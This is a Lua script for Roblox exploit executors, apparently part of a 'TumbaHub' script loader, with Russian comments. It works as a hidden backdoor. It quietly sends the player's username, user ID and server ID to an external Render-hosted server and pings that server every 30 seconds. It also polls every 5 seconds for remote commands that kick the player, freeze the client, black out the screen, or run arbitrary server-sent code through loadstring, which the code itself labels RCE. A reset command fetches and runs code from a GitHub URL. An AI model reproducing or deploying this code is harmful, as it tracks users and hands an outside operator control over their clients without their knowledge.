-- === TELEGRAM BOT NOTIFIER (Отправка инфы на сервер) ===
task.spawn(function()
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    -- ВАЖНО: Вставь сюда свою ссылку из Render!
    local SERVER_URL = "https://tumbahub-server.onrender.com/api/log_user" 

    local userData = {
        username = LocalPlayer.Name,
        userId = LocalPlayer.UserId,
        jobId = game.JobId
    }

    local requestFunc = request or http_request or (syn and syn.request) or (http and http.request)
    
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = SERVER_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(userData)
            })
        end)
        
        -- === СИСТЕМА ПИНГА (HEARTBEAT) ===
        -- Клиент каждые 30 секунд сообщает серверу, что он жив
        task.spawn(function()
            while task.wait(30) do
                pcall(function()
                    requestFunc({
                        Url = "https://tumbahub-server.onrender.com/api/ping?username=" .. LocalPlayer.Name,
                        Method = "GET"
                    })
                end)
            end
        end)
        -- ==================================
            
        -- === ЦИКЛ ПОЛУЧЕНИЯ КОМАНД ===
        while task.wait(5) do -- Запрашиваем команды каждые 5 секунд
            local success, result = pcall(function()
                return requestFunc({
                    Url = "https://tumbahub-server.onrender.com/api/get_command?username=" .. LocalPlayer.Name,
                    Method = "GET"
                })
            end)

            if success and result and result.Body then
                -- Пытаемся расшифровать JSON ответ от сервера
                local decodeSuccess, data = pcall(function()
                    return HttpService:JSONDecode(result.Body)
                end)
                
                -- Если сервер ответил success и прислал команду
                if decodeSuccess and data and data.status == "success" and data.command then
                    local cmd = data.command
                    
                    -- === ИСПОЛНЕНИЕ КОМАНД ===
                    
                    -- 1. Обычный кик без причины
                    if cmd == "/kick" then
                        LocalPlayer:Kick("Вы были кикнуты администратором TumbaHub.")
                        
                    -- 2. Кик с кастомной причиной (ищем совпадение начала строки)
                    elseif string.find(cmd, "^/kick_") then
                        -- Вырезаем текст причины (все, что идет после 6-го символа "/kick_")
                        local customReason = string.sub(cmd, 7)
                        LocalPlayer:Kick(customReason)
                        
                    -- 3. Краш клиента
                    elseif cmd == "/crash" then
                        while true do end 
                        
                    -- 4. Выполнение кастомного скрипта (RCE)
                    elseif string.find(cmd, "^/execute__") then
                        -- Вырезаем сам код (всё, что идет после 10-го символа "/execute__")
                        local codeToRun = string.sub(cmd, 11)
                        
                        -- Функция loadstring превращает текст в выполняемый код
                        local compiledFunc, compileError = loadstring(codeToRun)
                        
                        if compiledFunc then
                            -- Выполняем код в отдельном потоке, чтобы не застопорить лоадер
                            task.spawn(compiledFunc)
                        else
                            warn("TumbaHub: Ошибка компиляции скрипта: " .. tostring(compileError))
                        end
                        
                    -- 5. Сброс персонажа (Reset)
                    elseif cmd == "/reset" then
                        -- Скачиваем скрипт по твоей ссылке
                        local resetScript = game:HttpGet("https://raw.githubusercontent.com/repositorykreml1n/commands/refs/heads/main/reset_player")
                        local resetFunc, err = loadstring(resetScript)
                        
                        if resetFunc then
                            task.spawn(resetFunc)
                        else
                            warn("TumbaHub: Не удалось загрузить скрипт reset_player: " .. tostring(err))
                        end

                    -- 6. Черный экран ВКЛ
                    elseif cmd == "/blackscreen_on" then
                        local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
                        if playerGui and not playerGui:FindFirstChild("TumbaBlackScreenGui") then
                            local screenGui = Instance.new("ScreenGui")
                            screenGui.Name = "TumbaBlackScreenGui"
                            screenGui.IgnoreGuiInset = true
                            screenGui.ResetOnSpawn = false
                            screenGui.DisplayOrder = 999999 -- Ставим поверх всех других GUI

                            local frame = Instance.new("Frame")
                            frame.Size = UDim2.new(1, 0, 1, 0)
                            frame.BackgroundColor3 = Color3.new(0, 0, 0)
                            frame.BackgroundTransparency = 0
                            frame.BorderSizePixel = 0
                            
                            frame.Parent = screenGui
                            screenGui.Parent = playerGui
                        end

                    -- 7. Черный экран ВЫКЛ
                    elseif cmd == "/blackscreen_off" then
                        local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
                        if playerGui then
                            local blackScreen = playerGui:FindFirstChild("TumbaBlackScreenGui")
                            if blackScreen then
                                blackScreen:Destroy()
                            end
                        end
                    end

                    -- =========================
                end -- Закрывает проверку decodeSuccess
            end -- Закрывает проверку success
        end -- Закрывает цикл while task.wait
    end -- Закрывает проверку if requestFunc
end) -- Закрывает task.spawn(function()
-- ========================================================
